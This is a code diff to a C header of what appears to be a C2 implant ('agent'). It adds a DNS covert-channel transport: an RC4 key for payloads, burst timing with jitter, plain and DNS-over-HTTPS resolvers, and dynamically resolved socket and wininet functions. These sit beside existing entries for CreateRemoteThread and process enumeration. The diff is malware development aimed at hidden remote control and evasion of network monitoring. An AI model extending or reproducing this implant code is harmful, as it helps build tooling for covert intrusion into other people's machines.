@@ -118,8 +118,16 @@ typedef struct
 #endif
 
 #ifdef TRANSPORT_DNS
-            LPWSTR  Domain;    /* C2 domain the agent resolves against */
-            DWORD   Frequency; /* seconds between job polls */
+            LPWSTR  Domain;       /* C2 domain the agent resolves against */
+            DWORD   Frequency;    /* seconds between job polls */
+            BYTE    EncryptKey[16]; /* RC4 key of the DNS payloads */
+            DWORD   PktSize;      /* maximum size of a single answer */
+            DWORD   TTL;          /* TTL of the DNS answers */
+            BOOL    BurstEnabled; /* burst mode */
+            DWORD   BurstSleep;   /* milliseconds between two burst queries */
+            DWORD   BurstJitter;  /* jitter of the burst delay in percent */
+            LPWSTR  Resolvers;    /* plain DNS resolvers */
+            LPWSTR  DohResolvers; /* DNS over HTTPS resolvers */
 #endif
         } Transport;
 
@@ -229,6 +237,10 @@ typedef struct
 
         // Kernel32
         WIN_FUNC( LoadLibraryW )
+#ifdef TRANSPORT_DNS
+        WIN_FUNC( GetTickCount )
+        WIN_FUNC( Sleep )
+#endif
         WIN_FUNC( CreateRemoteThread )
         WIN_FUNC( CreateToolhelp32Snapshot )
         WIN_FUNC( Process32FirstW )
@@ -404,6 +416,28 @@ typedef struct
         WIN_FUNC( connect )
         WIN_FUNC( getaddrinfo )
         WIN_FUNC( freeaddrinfo )
+
+#ifdef TRANSPORT_DNS
+        WIN_FUNC( socket )
+        WIN_FUNC( sendto )
+        WIN_FUNC( recvfrom )
+        WIN_FUNC( select )
+        WIN_FUNC( gethostbyname )
+#endif
+
+#ifdef TRANSPORT_DNS
+        /* wininet.dll, used for the DNS over HTTPS fallback */
+        DNS_FUNC_INTERNETOPENA InternetOpenA;
+        DNS_FUNC_INTERNETCONNECTA InternetConnectA;
+        DNS_FUNC_HTTPOPENREQUESTA HttpOpenRequestA;
+        DNS_FUNC_HTTPSENDREQUESTA HttpSendRequestA;
+        DNS_FUNC_INTERNETSETOPTIONA InternetSetOptionA;
+        DNS_FUNC_INTERNETQUERYOPTIONA InternetQueryOptionA;
+        DNS_FUNC_HTTPQUERYINFOA HttpQueryInfoA;
+        DNS_FUNC_INTERNETQUERYDATAAVAILABLE InternetQueryDataAvailable;
+        DNS_FUNC_INTERNETCLOSEHANDLE InternetCloseHandle;
+        DNS_FUNC_INTERNETREADFILE InternetReadFile;
+#endif
 
         /* dnsapi.dll */
 #ifdef TRANSPORT_DNS
